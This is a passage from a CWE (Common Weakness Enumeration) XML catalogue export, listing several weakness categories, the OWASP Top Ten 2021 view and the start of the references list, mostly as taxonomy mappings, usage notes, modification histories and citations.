               <xhtml:p>Rationale: this entry is a Category. Using categories for mapping has been an actively discouraged practice since at least 2019.  Categories are informal organizational groupings of weaknesses that help navigation and browsing by CWE users, but they are not weaknesses in themselves [REF-1287]. This CWE ID may have become widely-used because of NIST's usage in NVD from 2008 to 2016 (see CWE-635 view, updated to the CWE-1003 view in 2016).</xhtml:p>
               <xhtml:p>Comments: some weakness-oriented alternatives might be found under Improper Authentication (CWE-287) or keyword searches for credentials.</xhtml:p>
	    </Note>
         </Notes>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Community</Submission_Name>
                <Submission_Date>2006-07-19</Submission_Date>
				<Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Detection_Factors</Modification_Comment>
            </Modification>
			<Modification>
				<Modification_Name>CWE Content Team</Modification_Name>
				<Modification_Organization>MITRE</Modification_Organization>
				<Modification_Date>2019-06-20</Modification_Date>
				<Modification_Comment>updated Relationships</Modification_Comment>
			</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
			<Previous_Entry_Name Date="2020-02-24">Credentials Management</Previous_Entry_Name>
         </Content_History>
      </Category>
      <Category ID="264" Name="Permissions, Privileges, and Access Controls" Status="Obsolete">
         <Summary>Weaknesses in this category are related to the management of permissions, privileges, and other security features that are used to perform access control.</Summary>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Permissions, Privileges, and ACLs</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 7, &#34;How Tokens, Privileges, SIDs, ACLs, and Processes Relate&#34; Page 218"/>
	   <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Notes>
            <Note Type="Mapping">
               <xhtml:p>Use for Mapping: Prohibited (this CWE ID must not be used to map to real-world vulnerabilities).</xhtml:p>
               <xhtml:p>Rationale: this entry is a Category. Using categories for mapping has been an actively discouraged practice since at least 2019.  Categories are informal organizational groupings of weaknesses that help navigation and browsing by CWE users, but they are not weaknesses in themselves [REF-1287]. This CWE ID may have become widely-used because of NIST's usage in NVD from 2008 to 2016 (see CWE-635 view, updated to the CWE-1003 view in 2016).</xhtml:p>
               <xhtml:p>Comments: some weakness-oriented alternatives might be found as descendants under Improper Access Control (CWE-284). Note: use of CWE-284 is Discouraged; see CWE-284's Mapping Notes.</xhtml:p>
	    </Note>
            <Note Type="Maintenance">This entry heavily overlaps other categories and has been marked obsolete.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Detection_Factors, Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="275" Name="Permission Issues" Status="Draft">
         <Summary>Weaknesses in this category are related to improper assignment or handling of permissions.</Summary>
         <Relationships>
            <Has_Member CWE_ID="276" View_ID="699"/>
            <Has_Member CWE_ID="277" View_ID="699"/>
            <Has_Member CWE_ID="278" View_ID="699"/>
            <Has_Member CWE_ID="279" View_ID="699"/>
            <Has_Member CWE_ID="280" View_ID="699"/>
            <Has_Member CWE_ID="281" View_ID="699"/>
            <Has_Member CWE_ID="618" View_ID="699"/>
            <Has_Member CWE_ID="766" View_ID="699"/>
            <Has_Member CWE_ID="767" View_ID="699"/>
         </Relationships>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Permission errors</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Broken Access Control</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Insecure Configuration Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 17: Failure to Protect Stored Data.&#34; Page 253"/>
         </References>
         <Notes>
	   <Note Type="Terminology">Permissions are associated with a resource and specify which actors are allowed to access that resource and what they are allowed to do with that access (e.g., read it, modify it). Privileges are associated with an actor and define which behaviors or actions an actor is allowed to perform.</Note>
           <Note Type="Mapping">
             <xhtml:p>Use for Mapping: Prohibited (this CWE ID must not be used to map to real-world vulnerabilities).</xhtml:p>
             <xhtml:p>Rationale: this entry is a Category. Using categories for mapping has been an actively discouraged practice since at least 2019.  Categories are informal organizational groupings of weaknesses that help navigation and browsing by CWE users, but they are not weaknesses in themselves.</xhtml:p>
             <xhtml:p>Comments: consider mapping to weaknesses that are members of this Category.</xhtml:p>
	   </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Detection_Factors, Functional_Areas, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships, Terminology_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Terminology_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="310" Name="Cryptographic Issues" Status="Draft">
         <Summary>Weaknesses in this category are related to the design and implementation of data confidentiality and integrity. Frequently these deal with the use of encoding techniques, encryption libraries, and hashing algorithms. The weaknesses in this category could lead to a degradation of the quality data if they are not addressed.</Summary>
         <Relationships>
            <Has_Member CWE_ID="261" View_ID="699"/>
            <Has_Member CWE_ID="324" View_ID="699"/>
            <Has_Member CWE_ID="325" View_ID="699"/>
            <Has_Member CWE_ID="328" View_ID="699"/>
            <Has_Member CWE_ID="331" View_ID="699"/>
            <Has_Member CWE_ID="334" View_ID="699"/>
            <Has_Member CWE_ID="335" View_ID="699"/>
            <Has_Member CWE_ID="338" View_ID="699"/>
            <Has_Member CWE_ID="347" View_ID="699"/>
            <Has_Member CWE_ID="916" View_ID="699"/>
            <Has_Member CWE_ID="1240" View_ID="699"/>
         </Relationships>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Cryptographic Issues</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 8, &#34;Cryptographic Foibles&#34; Page 259"/>
	   <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Notes>
            <Note Type="Mapping">
               <xhtml:p>Use for Mapping: Prohibited (this CWE ID must not be used to map to real-world vulnerabilities).</xhtml:p>
               <xhtml:p>Rationale: this entry is a Category. Using categories for mapping has been an actively discouraged practice since at least 2019.  Categories are informal organizational groupings of weaknesses that help navigation and browsing by CWE users, but they are not weaknesses in themselves [REF-1287]. This CWE ID may have become widely-used because of NIST's usage in NVD from 2008 to 2016 (see CWE-635 view, updated to the CWE-1003 view in 2016).</xhtml:p>
               <xhtml:p>Comments: some weakness-oriented alternatives might be found as descendants under Use of a Broken or Risky Cryptographic Algorithm (CWE-327)</xhtml:p>
	    </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationship_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Functional_Areas, References, Related_Attack_Patterns, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="720" Name="OWASP Top Ten 2007 Category A9 - Insecure Communications" Status="Obsolete">
         <Summary>Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2007.</Summary>
         <Relationships>
            <Has_Member CWE_ID="311" View_ID="629"/>
            <Has_Member CWE_ID="321" View_ID="629"/>
            <Has_Member CWE_ID="325" View_ID="629"/>
            <Has_Member CWE_ID="326" View_ID="629"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-271"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2008-09-09</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="818" Name="OWASP Top Ten 2010 Category A9 - Insufficient Transport Layer Protection" Status="Obsolete">
         <Summary>Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2010.</Summary>
         <Relationships>
            <Has_Member CWE_ID="311" View_ID="809"/>
            <Has_Member CWE_ID="319" View_ID="809"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-769"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2010-06-17</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="840" Name="Business Logic Errors" Status="Incomplete">
         <Summary>Weaknesses in this category identify some of the underlying problems that commonly allow attackers to manipulate the business logic of an application. Errors in business logic can be devastating to an entire application. They can be difficult to find automatically, since they typically involve legitimate use of the application's functionality. However, many business logic errors can exhibit patterns that are similar to well-understood implementation and design weaknesses.</Summary>
         <Relationships>
            <Has_Member CWE_ID="283" View_ID="699"/>
            <Has_Member CWE_ID="288" View_ID="699"/>
            <Has_Member CWE_ID="639" View_ID="699"/>
            <Has_Member CWE_ID="640" View_ID="699"/>
            <Has_Member CWE_ID="708" View_ID="699"/>
            <Has_Member CWE_ID="770" View_ID="699"/>
            <Has_Member CWE_ID="826" View_ID="699"/>
            <Has_Member CWE_ID="837" View_ID="699"/>
            <Has_Member CWE_ID="841" View_ID="699"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-795"/>
            <Reference External_Reference_ID="REF-796"/>
            <Reference External_Reference_ID="REF-797"/>
            <Reference External_Reference_ID="REF-798"/>
            <Reference External_Reference_ID="REF-799"/>
            <Reference External_Reference_ID="REF-667"/>
            <Reference External_Reference_ID="REF-801"/>
            <Reference External_Reference_ID="REF-802" Section="pages 29 - 41"/>
            <Reference External_Reference_ID="REF-1102"/>
         </References>
         <Notes>
            <Note Type="Terminology">
               <xhtml:p>The "Business Logic" term is generally used to describe issues that require domain-specific knowledge or "business rules" to determine if they are weaknesses or vulnerabilities, instead of legitimate behavior. Such issues might not be easily detectable via automatic code analysis, because the associated operations do not produce clear errors or undefined behavior at the code level. However, many such "business logic" issues can be understood as instances of other weaknesses such as input validation, access control, numeric computation, order of operations, etc.</xhtml:p>
	    </Note>
            <Note Type="Research Gap">
               <xhtml:p>The classification of business logic flaws has been under-studied, although exploitation of business flaws frequently happens in real-world systems, and many applied vulnerability researchers investigate them. The greatest focus is in web applications. There is debate within the community about whether these problems represent particularly new concepts, or if they are variations of well-known principles.</xhtml:p>
               <xhtml:p>Many business logic flaws appear to be oriented toward business processes, application flows, and sequences of behaviors, which are not as well-represented in CWE as weaknesses related to input validation, memory management, etc.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2011-03-24</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Description, Observed_Examples, References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Terminology_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="937" Name="OWASP Top Ten 2013 Category A9 - Using Components with Known Vulnerabilities" Status="Obsolete">
         <Summary>Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2013.</Summary>
         <References>
            <Reference External_Reference_ID="REF-936"/>
         </References>
         <Notes>
            <Note Type="Relationship">This is an unusual category. CWE does not cover the limitations of human processes and procedures that cannot be described in terms of a specific technical weakness as resident in the code, architecture, or configuration of the software. Since "known vulnerabilities" can arise from any kind of weakness, it is not possible to map this OWASP category to other CWE entries, since it would effectively require mapping this category to ALL weaknesses.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-16</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
   </Categories>
   <Views>
      <View ID="1344" Name="Weaknesses in OWASP Top Ten (2021)" Type="Graph" Status="Incomplete">
         <Objective>CWE entries in this view (graph) are associated with the OWASP Top Ten, as released in 2021.</Objective>
         <Audience>
            <Stakeholder>
               <Type>Software Developers</Type>
               <Description>This view outlines the most important issues as identified by the OWASP Top Ten (2021 version), providing a good starting point for web application developers who want to code more securely.</Description>
            </Stakeholder>
            <Stakeholder>
               <Type>Product Customers</Type>
               <Description>This view outlines the most important issues as identified by the OWASP Top Ten (2021 version), providing product customers with a way of asking their software development teams to follow minimum expectations for secure code.</Description>
            </Stakeholder>
            <Stakeholder>
               <Type>Educators</Type>
               <Description>Since the OWASP Top Ten covers the most frequently encountered issues, this view can be used by educators as training material for students.</Description>
            </Stakeholder>
         </Audience>
	 <Members>
	    <Has_Member CWE_ID="1345" View_ID="1344"/>
	    <Has_Member CWE_ID="1346" View_ID="1344"/>
	    <Has_Member CWE_ID="1347" View_ID="1344"/>
	    <Has_Member CWE_ID="1348" View_ID="1344"/>
	    <Has_Member CWE_ID="1349" View_ID="1344"/>
	    <Has_Member CWE_ID="1352" View_ID="1344"/>
	    <Has_Member CWE_ID="1353" View_ID="1344"/>
	    <Has_Member CWE_ID="1354" View_ID="1344"/>
	    <Has_Member CWE_ID="1355" View_ID="1344"/>
	    <Has_Member CWE_ID="1356" View_ID="1344"/>
	 </Members>
         <References>
            <Reference External_Reference_ID="REF-1206"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.6, the relationships in this view were pulled directly from the CWE mappings cited in the 2021 OWASP Top Ten. These mappings include categories and high-level weaknesses. One mapping to a deprecated entry was removed. The CWE Program will work with OWASP to improve these mappings, possibly requiring modifications to CWE itself.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2021-10-05</Submission_Date>
            </Submission>
         </Content_History>
      </View>
   </Views>
   <External_References>
      <External_Reference Reference_ID="REF-2">
			<Author>OWASP</Author>
			<Title>HttpOnly</Title>
			<URL>https://www.owasp.org/index.php/HttpOnly</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-3">
			<Author>Michael Howard</Author>
			<Title>Some Bad News and Some Good News</Title>
			<Publication_Year>2002</Publication_Year>
			<URL>https://msdn.microsoft.com/en-us/library/ms972826.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-4">
			<Author>Troy Hunt</Author>
			<Title>C is for cookie, H is for hacker - understanding HTTP only and Secure cookies</Title>
			<Publication_Year>2013</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<URL>https://www.troyhunt.com/c-is-for-cookie-h-is-for-hacker/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-5">
			<Author>Microsoft</Author>
			<Title>Mitigating Cross-site Scripting With HTTP-only Cookies</Title>
			<URL>https://msdn.microsoft.com/en-us/library/ms533046.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-6">
			<Author>Katrina Tsipenyuk</Author>
			<Author>Brian Chess</Author>
			<Author>Gary McGraw</Author>
			<Title>Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors</Title>
			<Publication>NIST Workshop on Software Security Assurance Tools Techniques and Metrics</Publication>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---07</Publication_Day>
			<Publisher>NIST</Publisher>
			<URL>https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-7">
			<Author>Michael Howard</Author>
			<Author>David LeBlanc</Author>
			<Title>Writing Secure Code</Title>
			<Edition>2nd Edition</Edition>
			<Publication_Year>2002</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---04</Publication_Day>
			<Publisher>Microsoft Press</Publisher>
			<URL>https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-18">
			<Author>Secure Software, Inc.</Author>
			<Title>The CLASP Application Security Process</Title>
			<Publication_Year>2005</Publication_Year>
			<URL>https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-35">
			<Author>Andrew Horton</Author>
			<Title>Clickjacking For Shells</Title>
			<URL>https://www.exploit-db.com/docs/17881.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-36">
			<Author>OWASP</Author>
			<Title>Clickjacking - OWASP</Title>
			<URL>https://www.owasp.org/index.php/Clickjacking</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-37">
			<Author>Internet Security</Author>
			<Title>SecTheory</Title>
			<URL>http://www.sectheory.com/clickjacking.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-38">
			<Author>W3C</Author>
			<Title>Content Security Policy Level 3</Title>
			<URL>https://w3c.github.io/webappsec-csp/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-43">
			<Author>OWASP</Author>
			<Title>OWASP TOP 10</Title>
			<URL>http://www.owasp.org/index.php/Top_10_2007</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-44">
			<Author>Michael Howard</Author>
			<Author>David LeBlanc</Author>
			<Author>John Viega</Author>
			<Title>24 Deadly Sins of Software Security</Title>
